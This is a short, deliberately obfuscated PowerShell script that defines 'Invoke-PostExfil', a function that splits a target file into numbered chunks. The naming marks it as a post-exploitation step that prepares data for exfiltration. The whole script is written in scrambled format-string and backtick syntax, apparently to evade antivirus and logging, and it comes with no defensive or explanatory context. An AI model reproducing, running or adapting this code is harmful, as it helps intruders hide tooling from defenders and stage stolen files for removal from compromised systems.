seT  ht4 ([tYPe]("{0}{2}{1}{3}"-F 'SYsTEM','FiL','.IO.','e'))  ;
.("{4}{0}{3}{1}{2}{5}" -f 'nvok','-','PostExf','e','I','il') {
  

  function spl`IT(${i`NFile},  ${o`UTpR`EFIx}, [Int32] ${BUF`SizE}){

    ${st`ReAM} =  ${h`T4}::("{0}{2}{1}" -f 'O','nRead','pe').Invoke(${i`NF`Ile})
    ${C`hunK`NuM} = 1
    ${Ba`Rr} = &("{3}{1}{2}{0}"-f 'ect','-Ob','j','New') ("{1}{0}"-f 'yte[]','b') ${BUFS`Ize}

    while( ${byT`EsR`eAD} = ${sTR`eAM}.("{0}{1}" -f'Rea','d').Invoke(${ba`RR},0,${BUF`size})){
      ${O`UtFILE} = "$outPrefix$chunkNum"
      ${Os`Tr`eaM} =  (get-vaRIaBlE  HT4  -ValUE )::("{2}{0}{1}"-f'n','Write','Ope').Invoke(${oUt`Fi`le})
      ${osT`R`Eam}.("{0}{1}" -f'Wri','te').Invoke(${B`ARr},0,${byt`e`SRE`AD});
      ${OSTre`AM}.("{1}{0}"-f 'e','clos').Invoke();
      &("{1}{0}"-f'ho','ec') ('wrot'+'e '+"$outFile")
      ${chuN`k`NUm} += 1
    }
  }
}